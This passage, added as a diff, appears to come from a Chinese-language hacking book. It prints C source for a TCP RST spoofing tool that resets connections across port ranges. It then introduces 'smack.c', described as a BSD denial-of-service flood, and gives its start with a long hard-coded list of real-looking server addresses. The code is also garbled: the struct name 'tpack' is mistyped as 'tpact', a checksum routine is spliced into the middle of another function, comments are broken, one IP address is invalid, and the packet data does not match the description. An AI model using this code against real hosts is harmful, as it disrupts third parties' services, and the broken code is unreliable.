@@ -1,0 +1,298 @@
+
+```c
+spoof_port = i;
+
+for (j = atoi(argv[5]);j <= atoi(argv[6]) ;j++)
+{
+    target_port = j;
+    printf("%s : %d \t", argv[1],spoof_port);
+    printf("--> %s :%d\n",argv[2], target_port);
+    res=send_rst(argv[1],argv[2],spoof_port,target_port, HI_RST,
+HI_RST, 2);
+    usleep(SLEEPTIME);
+    res=send_rst(argv[1],argv[2],spoof_port,target_port,
+LO_RST,LO_RST, 2);
+    usleep(SLEEPTIME);
+}
+}
+return ERROR_SUCCESS;
+}
+
+// here we put it together
+int send_rst(char *fromhost, char *tohost, u_short fromport,u_short toport, u_long ack_sq, u_long s_seq, u_long spoof_id)
+{
+int i_result;
+int raw_sock;
+static struct sockaddr_in local_sin, remote_sin;
+struct tpack{
+    struct iphdr ip;
+    struct tcphdr tcp;
+}tpack;
+
+struct pseudo_header{                 // pseudo header 4 the checksum
+
+unsigned source_address;
+unsigned dest_address;
+unsigned char placeholder;
+unsigned char protocol;
+unsigned short tcp_length;
+struct tcphdr tcp;
+}pheader;
+
+// resolve_address((struct sockaddr *)&local_sin, fromhost, fromport);
+// resolve_address((struct sockaddr *)&remote_sin, tohost, toport);
+
+// TCP header
+tpack.tcp.source=htons(fromport);               // 16-bit Source port number
+tpack.tcp.dest=htons(toport);               // 16-bit Destination port
+tpack.tcp.seq=ntohl(s_seq);               // 32-bit Sequence Number */
+tpack.tcp.ack_seq=ntohl(ack_sq); // 32-bit Acknowledgement Number */
+tpact.tcp.doff=5; // Data offset */
+tpact.tcp.res1=0; // reserved */
+tpact.tcp.res2=0; // reserved */
+tpact.tcp.urg=0; // Urgent offset valid
+flag */
+tpact.tcp.ack=1; // Acknowledgement field valid flag */
+tpact.tcp.psh=0; // Push flag */
+tpact.tcp.rst=1; // Reset flag */
+tpact.tcp.syn=0; // Synchronize sequence numbers flag */
+tpact.tcp.fin=0; // Finish sending flag
+*/
+tpact.tcp.window=0; // 16-bit Window size */
+tpact.tcp.check=0; // 16-bit checksum (to be filled in below) */
+tpact.tcp.urg_ptr=0; // 16-bit urgent offset */
+
+// IP header
+tpact.ip.version=4; // 4-bit Version */
+tpact.ip.ihl=5; // 4-bit Header Length */
+tpact.ip.tos=0; // 8-bit Type of service */
+tpact.ip.tot_len=htons(IPHDR+TCPHDR); // 16-bit Total length */
+tpact.ip.id=htons(spoof_id); // 16-bit ID field */
+tpact.ip.frag_off=0; // 13-bit Fragment offset */
+tpact.ip.ttl=64; // 8-bit Time To Live */
+tpact.ip.protocol=IPPROTO_TCP; // 8-bit Protocol */
+tpact.ip.check=0; // 16-bit Header checksum (filled in below) */
+tpact.ip.saddr=local_sin.sin_addr.s_addr; // 32-bit Source Address */
+tpact.ip.daddr=remote_sin.sin_addr.s_addr; // 32-bit Destination Address */
+
+// IP header checksum
+tpact.ip.check=in_cksum((unsigned short *)&tpact.ip, IPHDR);
+
+sum += (sum >> 16); // add carry
+answer = ~sum; // ones-complement, then truncate to 16 bits
+return(answer);
+}
+
+// Resolve the address and populate the sin structs
+void resolve_address(struct sockaddr * addr, char *hostname, u_short port)
+{
+    struct sockaddr_in *address;
+    struct hostent     *host;
+
+    address = (struct sockaddr_in *)addr;
+    (void) bzero( (char *)address, sizeof(struct sockaddr_in) );
+
+    address->sin_family = AF_INET;
+    address->sin_port = htons(port);
+
+    address->sin_addr.s_addr = inet_addr(hostname);
+    if ((int)address->sin_addr.s_addr == -1) {
+        host = gethostbyname(hostname);
+        if (host) {
+            bcopy( host->h_addr, (char *)&address->
+                sin_addr,host->h_length);
+        }
+        else {
+            puts("Couldn't resolve the address!!!");
+            exit(ERROR_FAILURE);
+        }
+    }
+}
+```
+
+## **BSD 恐慌攻击**
+
+**概要：**一种 BSD 拒绝服务攻击，*smack.c* 会从自定义的随机 IP 地址发送随机 ICMP 不可达数据包。
+
+**漏洞：**所有。
+
+**破坏：**这种由 Iron Lungs 修改的拒绝服务攻击会导致平台冻结，因为受害者会从可定制的“\*Start”和“End”自定义部分之间的可定制地址接收到成千上万的数据包。
+
+**smack.c**
+
+```c
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#include <netinet/in.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <sys/uio.h>
+#include <unistd.h>
+char conn_pack0[] = { -128,0,0,12,1,81,85,65,75,69,0,3 };
+char conn_pack1[] = { -1,-1,-1,-
+    1,99,111,110,110,101,99,116,32,34,92,110,111,
+97,105,109,92,48,92,109,115,103,92,49,92,114,97,116,
+101,92,50,53,48,48,92,98,111,116,116,111,109,99,111,
+108,111,114,92,49,98,92,116,111,112,99,111,108,111,114,
+92,110,97,109,101,92,83,110,111,111,112,112,34
+,10
+};
+#define PS0 20+8+12
+#define PS1 20+8+strlen(conn_pack1)
+char *servers[] = {
+/* Start customizing here
+"129.15.3.38:26000:0",
+"207.123.126.4:26000:0",
+"129.15.3.38:26001:0",
+"129.15.3.38:26002:0",
+"192.107.41.7:26000:0",
+"157.182.246.58:26000:0",
+"128.52.42.22:26000:0",
+"209.51.213.12:26000:0",
+"209.112.14.200:26000:0",
+"144.92.218.112:26000:0",
+"200.239.253.14:26000:0",
+"134.147.141.98:26000:0",
+"137.48.127.127:26000:0",
+"209.51.192.228:26000:0",
+"159.134.244.134:26000:0",
+"207.229.129.193:26000:0",
+"194.125.2.219:26001:0",
+"206.98.138.162:26000:0",
+"134.193.111.241:26000:0",
+"207.40.196.13:26000:0",
+"209.26.6.121:26000:0",
+"208.194.67.16:26000:0",
+"205.163.58.20:26000:0",
+"199.247.156.6:26000:0",
+"12.72.1.37:26000:0",
+"216.65.157.101:26000:0",
+"206.103.0.200:26000:0",
+"207.198.211.22:26000:0",
+"148.176.238.89:26000:0",
+"208.255.165.53:26000:0",
+"208.240.197.32:26000:0",
+"209.192.31.148:26000:0",
+"159.134.244.132:26000:0",
+"195.96.122.8:26000:0",
+"209.30.67.88:26000:0",
+"209.36.105.50:26000:0",
+"62.136.15.45:26000:0",
+"208.18.129.2:26000:0",
+"208.0.188.6:26000:0",
+"208.137.128.24:26000:0",
+"198.106.23.1:26000:0",
+"209.122.33.45:26000:0",
+"208.23.24.79:26000:0",
+"200.34.211.10:26000:0",
+"208.45.42.111:26000:0",
+"203.23.47.43:26000:0",
+"207.239.192.51:26000:0",
+"165.166.140.122:26000:0",
+"207.19.125.13:26000:0",
+"144.92.229.122:26000:0",
+"199.202.71.203:26000:0",
+"200.255.244.2:26000:0",
+"207.30.184.9:26000:0",
+"129.186.121.53:26000:0",
+"204.210.15.71:26000:0",
+"198.101.39.41:26000:0",
+"203.45.23.123:26000:0",
+"205.23.45.223:26000:0",
+"34.224.14.118:26000:0",
+"200.24.34.116:26000:0",
+"133.45.342.124:26000:0",
+"192.52.220.101:26000:0",
+"194.126.80.142:26000:0",
+"206.171.181.1:26000:0",
+"208.4.5.9:26000:0",
+"206.246.194.16:26000:0",
+"205.139.62.15:26000:0",
+"204.254.98.15:26000:0",
+"207.206.116.41:26000:0",
+"208.130.10.26:26000:0",
+"207.126.70.69:26000:0",
+"38.241.229.103:26000:0",
+"204.170.191.6:26000:0",
+"144.92.243.243:26000:0",
+"144.92.111.117:26000:0",
+"194.229.103.195:26000:0",
+"208.134.73.42:26000:0",
+"207.64.79.1:26000:0",
+"171.64.65.70:26004:0",
+"207.13.110.4:26000:0",
+"204.253.208.245:26000:0",
+"165.166.144.45:26000:0",
+"128.252.22.47:26000:0",
+"204.210.15.71:26001:0",
+"193.88.50.50:26000:0",
+"209.155.24.25:26000:0",
+"204.49.131.19:26000:0",
+"199.67.51.102:26000:0",
+"207.114.144.200:26000:0",
+"165.166.140.140:26000:0",
+"38.233.80.136:26000:0",
+"204.216.57.249:26000:0",
+"199.72.175.4:26000:0",
+"204.91.237.250:26000:0",
+"206.191.0.209:26000:0",
+"194.109.6.220:26000:0",
+"207.67.188.25:26000:0",
+"160.45.32.176:26000:0",
+"206.246.194.15:26000:0",
+"207.65.182.12:26000:0",
+"204.213.176.8:26000:0",
+"207.99.85.67:26000:0",
+"209.172.129.66:26000:0",
+"132.230.63.23:26000:0",
+"206.149.144.14:26000:0",
+"147.188.209.113:26000:0",
+"204.141.86.42:26000:0",
+"207.8.164.27:26000:0",
+"204.254.98.11:26000:0",
+"204.216.126.251:26000:0",
+"207.206.65.5:26000:0",
+"209.12.170.11:26000:0",
+"131.111.226.98:26000:0",
+"194.65.5.103:26000:0",
+"204.202.54.95:26000:0",
+"204.97.179.4:26000:0",
+"24.0.147.54:26000:0",
+"207.170.48.24:26000:0",
+"199.217.218.8:26000:0",
+"207.166.192.85:26000:0",
+"206.154.148.145:26000:0",
+"206.248.16.16:26000:0",
+"200.241.188.3:26000:0",
+"204.177.71.10:26000:0",
+"140.233.207.207:26000:0",
+"207.218.51.13:26000:0",
+"194.109.6.217:26000:0",
+"207.236.41.30:26000:0",
+"195.162.196.42:26000:0",
+"209.49.51.98:26020:0",
+"198.106.166.188:26000:0",
+"207.239.212.113:26000:0",
+"165.91.3.91:26000:0",
+"128.95.25.184:26666:0",
+"128.2.237.78:26001:0",
+"128.2.237.78:26003:0",
+"207.254.73.2:26000:0",
+"208.225.207.3:26666:0",
+"171.64.65.70:26666:0",
+"208.225.207.3:26001:0",
+"128.2.237.78:26000:0",
+"129.21.113.71:26000:0",
+"195.74.96.45:26000:0",
+"206.129.112.27:26000:0",
+"199.67.51.101:26000:0"
+};
+```
+
